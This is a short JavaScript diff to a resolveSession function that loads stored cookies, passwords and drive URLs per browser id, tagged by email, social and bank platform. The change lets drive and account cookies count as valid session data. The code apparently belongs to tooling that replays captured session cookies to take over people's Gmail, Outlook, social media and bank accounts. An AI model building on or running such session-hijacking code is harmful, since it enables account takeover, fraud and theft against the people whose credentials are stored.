@@ -28,6 +28,8 @@ export async function resolveSession(browserId) {
         ? storedPlatform
         : detectEmailPlatform(domain);
     const platformSource = (storedPlatform === 'gmail' || storedPlatform === 'outlook') ? 'stored' : 'domain';
+    const driveCookieJSON = col('driveCookieJSON') || '';
+    const accountCookieJSON = col('accountCookieJSON') || col('accountCookie') || '';
     const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
     const password = col('password') || '';
     const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
@@ -37,7 +39,7 @@ export async function resolveSession(browserId) {
         try { browserIdentity = typeof browserIdentityRaw === 'string' ? JSON.parse(browserIdentityRaw) : browserIdentityRaw; } catch (_) {}
     }
 
-    if (!cookieJSON) throw new Error(`No cookieJSON found for browserId: ${browserId}`);
+    if (!cookieJSON && !driveCookieJSON && !accountCookieJSON) throw new Error(`No cookie data found for browserId: ${browserId}`);
 
     // Best-effort platform hint for SOCIAL/BANK rows, read from the stored
     // socials/banks arrays (e.g. [{ platform: 'instagram', ... }]).
@@ -64,6 +66,8 @@ export async function resolveSession(browserId) {
         socialPlatform,
         socialUsername,
         bankPlatform,
+        driveCookieJSON: typeof driveCookieJSON === 'string' ? driveCookieJSON : (driveCookieJSON ? JSON.stringify(driveCookieJSON) : ''),
+        accountCookieJSON: typeof accountCookieJSON === 'string' ? accountCookieJSON : (accountCookieJSON ? JSON.stringify(accountCookieJSON) : ''),
         cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
         driveUrl: driveUrl || '',
         category: col('category') || '',
